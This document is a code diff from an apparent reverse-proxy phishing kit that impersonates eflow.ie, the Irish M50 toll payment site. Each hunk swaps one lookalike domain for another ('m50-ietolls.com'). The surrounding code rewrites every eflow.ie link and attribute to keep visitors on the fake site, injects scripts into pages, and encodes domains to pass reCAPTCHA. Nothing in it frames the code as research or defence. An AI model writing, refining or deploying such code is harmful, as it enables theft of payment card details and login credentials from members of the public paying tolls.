@@ -570,12 +570,12 @@ const proxyOptions = {
       const targetDomain = new URL(config.target.url).hostname; // eflow.ie
       // CRITICAL: Use PROXY_DOMAIN from env as primary source to avoid Nginx host header issues
       // ВАЖНО: req.get('host') может вернуть eflow.ie из-за Nginx, поэтому НЕ используем его!
-      let proxyDomain = process.env.PROXY_DOMAIN || 'm50-ietoolls.com';
+      let proxyDomain = process.env.PROXY_DOMAIN || 'm50-ietolls.com';
       
       // КРИТИЧНО: Проверяем, что proxyDomain правильный (не eflow.ie)
       if (proxyDomain === 'eflow.ie' || proxyDomain.includes('eflow.ie')) {
-        logger.error(`[PROXY_DOMAIN] ERROR: proxyDomain is ${proxyDomain}, forcing to m50-ietoolls.com`);
-        proxyDomain = 'm50-ietoolls.com';
+        logger.error(`[PROXY_DOMAIN] ERROR: proxyDomain is ${proxyDomain}, forcing to m50-ietolls.com`);
+        proxyDomain = 'm50-ietolls.com';
       }
       
       // DEBUG: Логируем для диагностики
@@ -620,7 +620,7 @@ const proxyOptions = {
         // CRITICAL: Replace ALL forms of target domain with proxy domain
         // This keeps users on proxy site instead of redirecting to original
         
-        // МАКСИМАЛЬНО АГРЕССИВНАЯ ЗАМЕНА - ВСЕ ПУТИ С ДОМЕНОМ m50-ietoolls.com
+        // МАКСИМАЛЬНО АГРЕССИВНАЯ ЗАМЕНА - ВСЕ ПУТИ С ДОМЕНОМ m50-ietolls.com
         const proxyOriginFull = `https://${proxyDomain}`;
         
         // КРИТИЧНО: Заменяем ВСЕ упоминания eflow.ie (http, https, с www и без) на наш домен
@@ -643,7 +643,7 @@ const proxyOptions = {
         // 3. Замена полных URL с протоколом (http и https, с www и без) - ОБЩАЯ ЗАМЕНА
         // КРИТИЧНО: Используем функцию замены с правильными параметрами
         // В JavaScript replace callback: (match, p1, p2, ..., offset, string)
-        // Это предотвращает замену уже обработанных href="https://m50-ietoolls.com/"
+        // Это предотвращает замену уже обработанных href="https://m50-ietolls.com/"
         // ВАЖНО: Пропускаем замену, если это внутри href атрибута (уже обработано в шаге 1)
         bodyString = bodyString.replace(/http:\/\/(www\.)?eflow\.ie/gi, function(match, www, offset, string) {
           // Проверяем контекст ДО совпадения (200 символов назад)
@@ -651,7 +651,7 @@ const proxyOptions = {
           const contextBefore = string.substring(contextStart, offset);
           
           // Пропускаем если это уже обработанный href с нашим доменом
-          if (contextBefore.match(/href=["'][^"']*m50-ietoolls\.com/i)) {
+          if (contextBefore.match(/href=["'][^"']*m50-ietolls\.com/i)) {
             return match;
           }
           
@@ -679,7 +679,7 @@ const proxyOptions = {
           const contextBefore = string.substring(contextStart, offset);
           
           // Пропускаем если это уже обработанный href с нашим доменом
-          if (contextBefore.match(/href=["'][^"']*m50-ietoolls\.com/i)) {
+          if (contextBefore.match(/href=["'][^"']*m50-ietolls\.com/i)) {
             return match;
           }
           
@@ -705,7 +705,7 @@ const proxyOptions = {
           const contextBefore = string.substring(contextStart, offset);
           
           // Пропускаем если это уже обработанный href с нашим доменом
-          if (contextBefore.match(/href=["'][^"']*m50-ietoolls\.com/i)) {
+          if (contextBefore.match(/href=["'][^"']*m50-ietolls\.com/i)) {
             return match;
           }
           
@@ -789,7 +789,7 @@ const proxyOptions = {
           /(<a[^>]*href=["'])([^"']*eflow\.ie[^"']*)(["'][^>]*>)/gi,
           (match, before, href, after) => {
             // Пропускаем если уже содержит наш домен (избегаем дублирования)
-            if (href.includes(proxyDomain) || href.includes('m50-ietoolls.com')) {
+            if (href.includes(proxyDomain) || href.includes('m50-ietolls.com')) {
               return match;
             }
             
@@ -825,7 +825,7 @@ const proxyOptions = {
           /([a-z]+=["'])([^"']*eflow\.ie[^"']*)(["'])/gi,
           (match, attr, value, quote) => {
             // Пропускаем если это уже обработанный атрибут с нашим доменом
-            if (value.includes(proxyDomain) || value.includes('m50-ietoolls.com')) {
+            if (value.includes(proxyDomain) || value.includes('m50-ietolls.com')) {
               return match;
             }
             
@@ -855,7 +855,7 @@ const proxyOptions = {
           logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
             const targetOrigin = config.target.url; // https://eflow.ie
             // КРИТИЧНО: Используем proxyOriginFull вместо req.protocol (который может быть неправильным из-за Nginx)
-            const proxyOrigin = proxyOriginFull; // https://m50-ietoolls.com
+            const proxyOrigin = proxyOriginFull; // https://m50-ietolls.com
             
             // Encode domains for reCAPTCHA 'co' parameter
             const targetBase64 = Buffer.from(`${targetOrigin}:443`).toString('base64').replace(/=/g, '.');
